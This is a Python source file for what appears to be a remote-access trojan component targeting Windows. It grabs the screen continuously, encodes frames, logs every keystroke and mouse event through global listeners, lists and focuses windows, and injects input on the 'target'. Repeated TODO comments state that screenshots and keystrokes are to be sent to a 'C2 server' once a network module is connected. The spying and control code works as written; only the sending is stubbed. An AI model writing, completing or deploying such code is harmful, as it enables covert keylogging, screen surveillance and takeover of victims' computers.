import os
import time
import base64
import threading
import numpy as np
from typing import Optional, Tuple
from PIL import Image
import mss
import mss.tools
from pynput import mouse, keyboard
import pyautogui
import win32gui
import win32con
import win32api
from io import BytesIO

class RemoteControl:
    def __init__(self):
        self.screen_capture = None
        self.keyboard_listener = None
        self.mouse_listener = None
        self.is_capturing = False
        self.is_controlling = False
        self.quality = 50  # JPEG quality (1-100)
        self.scale_factor = 0.5  # Scale factor for screen capture
        self._setup_screen_capture()
        
    def _setup_screen_capture(self):
        """Initialize screen capture"""
        try:
            self.screen_capture = mss.mss()
        except Exception as e:
            print(f"Error setting up screen capture: {str(e)}")
            
    def start_screen_capture(self) -> bool:
        """Start screen capture thread"""
        if self.is_capturing:
            return False
            
        self.is_capturing = True
        threading.Thread(
            target=self._capture_screen,
            daemon=True
        ).start()
        return True
        
    def stop_screen_capture(self) -> bool:
        """Stop screen capture"""
        self.is_capturing = False
        return True
        
    def _capture_screen(self):
        """Capture screen and send to C2"""
        while self.is_capturing:
            try:
                # Capture primary monitor
                screenshot = self.screen_capture.grab(
                    self.screen_capture.monitors[1]
                )
                
                # Convert to PIL Image
                img = Image.frombytes(
                    'RGB',
                    screenshot.size,
                    screenshot.rgb
                )
                
                # Resize for performance
                width, height = img.size
                new_size = (
                    int(width * self.scale_factor),
                    int(height * self.scale_factor)
                )
                img = img.resize(new_size, Image.Resampling.LANCZOS)
                
                # Convert to JPEG
                buffer = BytesIO()
                img.save(
                    buffer,
                    format='JPEG',
                    quality=self.quality
                )
                
                # Convert to base64
                img_str = base64.b64encode(
                    buffer.getvalue()
                ).decode()
                
                # TODO: Send to C2 server
                # This will be implemented when we connect
                # it to the network module
                
                # Sleep to control frame rate
                time.sleep(0.1)  # 10 FPS
                
            except Exception as e:
                print(f"Error capturing screen: {str(e)}")
                time.sleep(1)  # Wait before retrying
                
    def start_input_control(self) -> bool:
        """Start keyboard and mouse control"""
        if self.is_controlling:
            return False
            
        self.is_controlling = True
        
        # Start keyboard listener
        self.keyboard_listener = keyboard.Listener(
            on_press=self._on_keyboard_press,
            on_release=self._on_keyboard_release
        )
        self.keyboard_listener.start()
        
        # Start mouse listener
        self.mouse_listener = mouse.Listener(
            on_move=self._on_mouse_move,
            on_click=self._on_mouse_click,
            on_scroll=self._on_mouse_scroll
        )
        self.mouse_listener.start()
        
        return True
        
    def stop_input_control(self) -> bool:
        """Stop keyboard and mouse control"""
        if not self.is_controlling:
            return False
            
        self.is_controlling = False
        
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        if self.mouse_listener:
            self.mouse_listener.stop()
            
        return True
        
    def _on_keyboard_press(self, key):
        """Handle keyboard press events"""
        if not self.is_controlling:
            return
            
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key)
                
            # TODO: Send to C2 server
            # This will be implemented when we connect
            # it to the network module
            
        except Exception as e:
            print(f"Error handling keyboard press: {str(e)}")
            
    def _on_keyboard_release(self, key):
        """Handle keyboard release events"""
        if not self.is_controlling:
            return
            
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key)
                
            # TODO: Send to C2 server
            # This will be implemented when we connect
            # it to the network module
            
        except Exception as e:
            print(f"Error handling keyboard release: {str(e)}")
            
    def _on_mouse_move(self, x, y):
        """Handle mouse move events"""
        if not self.is_controlling:
            return
            
        try:
            # TODO: Send to C2 server
            # This will be implemented when we connect
            # it to the network module
            pass
            
        except Exception as e:
            print(f"Error handling mouse move: {str(e)}")
            
    def _on_mouse_click(self, x, y, button, pressed):
        """Handle mouse click events"""
        if not self.is_controlling:
            return
            
        try:
            # TODO: Send to C2 server
            # This will be implemented when we connect
            # it to the network module
            pass
            
        except Exception as e:
            print(f"Error handling mouse click: {str(e)}")
            
    def _on_mouse_scroll(self, x, y, dx, dy):
        """Handle mouse scroll events"""
        if not self.is_controlling:
            return
            
        try:
            # TODO: Send to C2 server
            # This will be implemented when we connect
            # it to the network module
            pass
            
        except Exception as e:
            print(f"Error handling mouse scroll: {str(e)}")
            
    def execute_mouse_action(
        self,
        action: str,
        x: int,
        y: int,
        button: str = 'left'
    ) -> bool:
        """Execute mouse action on target"""
        try:
            if action == 'move':
                pyautogui.moveTo(x, y)
            elif action == 'click':
                pyautogui.click(x, y, button=button)
            elif action == 'doubleclick':
                pyautogui.doubleClick(x, y, button=button)
            elif action == 'rightclick':
                pyautogui.rightClick(x, y)
            return True
        except Exception as e:
            print(f"Error executing mouse action: {str(e)}")
            return False
            
    def execute_keyboard_action(
        self,
        action: str,
        key: str
    ) -> bool:
        """Execute keyboard action on target"""
        try:
            if action == 'press':
                pyautogui.press(key)
            elif action == 'down':
                pyautogui.keyDown(key)
            elif action == 'up':
                pyautogui.keyUp(key)
            elif action == 'hotkey':
                pyautogui.hotkey(*key.split('+'))
            return True
        except Exception as e:
            print(f"Error executing keyboard action: {str(e)}")
            return False
            
    def get_window_list(self) -> list:
        """Get list of all windows"""
        windows = []
        def callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                if title:
                    windows.append({
                        'hwnd': hwnd,
                        'title': title,
                        'rect': win32gui.GetWindowRect(hwnd)
                    })
            return True
        win32gui.EnumWindows(callback, windows)
        return windows
        
    def focus_window(self, hwnd: int) -> bool:
        """Focus window by handle"""
        try:
            win32gui.SetForegroundWindow(hwnd)
            return True
        except Exception as e:
            print(f"Error focusing window: {str(e)}")
            return False
            
    def get_active_window(self) -> Optional[dict]:
        """Get active window information"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            return {
                'hwnd': hwnd,
                'title': win32gui.GetWindowText(hwnd),
                'rect': win32gui.GetWindowRect(hwnd)
            }
        except Exception as e:
            print(f"Error getting active window: {str(e)}")
            return None 